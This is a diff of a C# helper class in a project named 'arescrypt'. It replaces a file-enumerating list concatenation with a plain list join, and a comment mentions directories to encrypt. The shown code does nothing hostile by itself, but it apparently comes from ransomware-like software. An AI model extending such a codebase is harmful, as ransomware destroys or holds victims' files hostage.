@@ -6,25 +6,16 @@ namespace arescrypt
     class Misc
     {
         // Concatenates 2 List<string> arrays, then converts to string[] array.
-        public static string[] concatList(List<string> list1, List<string> list2)
+        public static List<string> concatList(List<string> List1, List<string> List2)
         {
-            string filesBeforeSplit = default(string);
-            
-            foreach (string dir in list1) // dirsToEncrypt.Distinct().ToList())
-            {
-                List<string> fileIndex = FileHandler.DirSearch(dir);
-                foreach (string file in fileIndex)
-                    filesBeforeSplit += ", " + file; // Concatenate the string
-            }
-            foreach (string dir in list2)
-            {
-                List<string> fileIndex = FileHandler.DirSearch(dir);
-                foreach (string file in fileIndex)
-                    filesBeforeSplit += ", " + file; // Concatenate the string
-            }
-
-            string[] fullFileIndex = filesBeforeSplit.Split(", ".ToCharArray());
-            return fullFileIndex;
+            var fullIndex = new List<string> { };
+            foreach (string element in List1)
+                fullIndex.Add(element);
+            foreach (string element in List2)
+                fullIndex.Add(element);
+            return fullIndex;
         }
+
+        // Converts List<string> to string
     }
 }
